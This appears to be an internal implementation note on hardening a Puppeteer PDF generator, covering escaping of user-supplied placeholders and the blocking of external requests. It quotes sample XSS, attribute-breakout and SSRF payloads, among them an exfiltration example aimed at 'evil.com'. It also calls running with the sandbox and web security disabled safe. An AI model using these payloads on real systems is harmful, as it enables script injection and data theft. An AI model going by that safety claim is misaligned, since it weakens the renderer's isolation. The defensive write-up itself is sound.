# PDF Injection Hardening Implementation

> **Implemented**: 2024-12-18  
> **Finding**: M5 (HTML injection in PDF templates), M6 (External resource loading)  
> **Status**: Complete

---

## Summary

Implemented comprehensive hardening for PDF generation:
- Enhanced HTML escaping for all user-controlled placeholders
- Added request interception to block external resource loading
- Only file:// and data: URLs allowed during PDF rendering

---

## Changes Made

### 1. Enhanced HTML Escaping

**File**: `src/lib/utils/placeholder-replacer.ts`

```typescript
// SECURITY: Escape HTML to prevent injection attacks in PDF templates
// All user-controlled values MUST pass through this before insertion
const escapeHtml = (s: string) => String(s)
  .replace(/&/g, '&amp;')
  .replace(/</g, '&lt;')
  .replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;')
  .replace(/'/g, '&#39;')
  .replace(/\//g, '&#x2F;')  // Forward slash - prevents closing tags
  .replace(/`/g, '&#x60;')   // Backtick - prevents template literals
```

**Characters Escaped**:

| Character | Escape | Purpose |
|-----------|--------|---------|
| `&` | `&amp;` | Prevent entity injection |
| `<` | `&lt;` | Prevent tag opening |
| `>` | `&gt;` | Prevent tag closing |
| `"` | `&quot;` | Prevent attribute breakout |
| `'` | `&#39;` | Prevent attribute breakout |
| `/` | `&#x2F;` | Prevent closing tags |
| `` ` `` | `&#x60;` | Prevent template literals |

**User-Controlled Values Escaped**:
- `<<Naam>>` - Candidate full name
- `<<Voornaam>>` - Candidate first name
- `<<Stijl>>` - Profile style label
- `<<Datum>>` - Date string

### 2. External Resource Blocking

**File**: `src/lib/services/pdf-generator.ts`

```typescript
// SECURITY: Block all external network requests - only allow file:// and data: URLs
await page.setRequestInterception(true)
page.on('request', (request) => {
  const url = request.url()
  if (url.startsWith('file://') || url.startsWith('data:')) {
    request.continue()
  } else {
    console.warn(`[pdf] Blocked external request: ${url}`)
    request.abort('blockedbyclient')
  }
})
```

**Allowed URLs**:
- `file://` - Local template files (CSS, images, fonts)
- `data:` - Inline data URLs (chart SVG)

**Blocked URLs**:
- `http://` - Any HTTP request
- `https://` - Any HTTPS request
- Any other protocol

---

## Security Model

### Before

```
User input → Template → Puppeteer → PDF
     ↓           ↓           ↓
  No escape   May load   Full network
             external      access
```

### After

```
User input → escapeHtml() → Template → Puppeteer → PDF
     ↓           ↓              ↓           ↓
  Untrusted   Sanitized     Local only   Blocked
                                         external
```

---

## Attack Vectors Mitigated

### 1. HTML Injection

**Attack**: User submits name like `<script>alert('xss')</script>`

**Before**: Script tag inserted into PDF template
**After**: Rendered as `&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;`

### 2. Attribute Breakout

**Attack**: User submits name like `" onclick="evil()"`

**Before**: Attribute injection possible
**After**: Rendered as `&quot; onclick=&quot;evil()&quot;`

### 3. External Resource Loading

**Attack**: Malicious template tries to load `<img src="https://evil.com/steal?data=...">`

**Before**: Request sent to evil.com
**After**: Request blocked, logged as warning

### 4. SSRF via PDF

**Attack**: Template contains `<iframe src="http://internal-service/">`

**Before**: Internal service accessed
**After**: Request blocked

---

## Verification

### Test: HTML Escaping

```typescript
// Input
const name = '<script>alert("xss")</script>'

// After escapeHtml()
// Output: '&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;'
```

### Test: External Request Blocking

```bash
# Check logs during PDF generation for blocked requests
# Should see: [pdf] Blocked external request: https://...
```

### Test: Malicious Name

```javascript
// Create candidate with malicious name
const maliciousName = '<img src=x onerror="alert(1)">'

// Generate PDF
// Verify: Name appears as literal text, not as image tag
```

---

## Puppeteer Security Flags

The following flags are used for PDF generation:

| Flag | Purpose |
|------|---------|
| `--no-sandbox` | Required for Docker/serverless |
| `--disable-setuid-sandbox` | Required for Docker/serverless |
| `--allow-file-access-from-files` | Allow local template loading |
| `--enable-local-file-accesses` | Allow local template loading |
| `--disable-web-security` | Allow file:// cross-origin (templates) |
| `--font-render-hinting=medium` | Better font rendering |

**Note**: `--disable-web-security` is required for file:// URLs to load cross-origin resources (fonts, CSS). This is safe because we block ALL external network requests via request interception.

---

## Files Modified

| File | Change |
|------|--------|
| `src/lib/utils/placeholder-replacer.ts` | Enhanced escapeHtml with `/` and `` ` `` |
| `src/lib/services/pdf-generator.ts` | Added request interception |

---

## Commits

```
fix(security): enhance HTML escaping in PDF placeholder replacer (C4)
fix(security): block external requests in PDF generation (C4)
```
